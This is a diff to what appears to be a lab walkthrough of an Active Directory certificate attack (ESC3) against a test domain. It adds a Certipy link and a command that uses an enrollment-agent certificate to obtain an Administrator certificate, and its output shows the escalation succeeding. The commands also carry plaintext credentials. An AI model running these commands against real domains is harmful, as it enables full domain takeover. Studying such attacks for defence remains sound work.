@@ -781,6 +781,8 @@ Two possible paths ESC3 or 7
 
 ## ESC3
 
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking
+
 ```python
 certipy-ad req -u 'sam.h@shadowgate.local' -p 'Password123!' -dc-ip '10.1.232.232' -target 'sg-dc01.shadowgate.local' -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent' -ldap-scheme ldap
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -792,6 +794,19 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-1114'
 [*] Saving certificate and private key to 'sam.h.pfx'
 [*] Wrote certificate and private key to 'sam.h.pfx'
+```
+
+```python
+certipy-ad req -u 'sam.h@shadowgate.local' -p 'Password123!' -dc-ip '10.1.232.232' -target 'sg-dc01.shadowgate.local' -ca 'Shadowgate-CA' -template 'User' -pfx 'sam.h.pfx' -on-behalf-of 'SHADOWGATE\Administrator' -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@shadowgate.local'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
 ```python
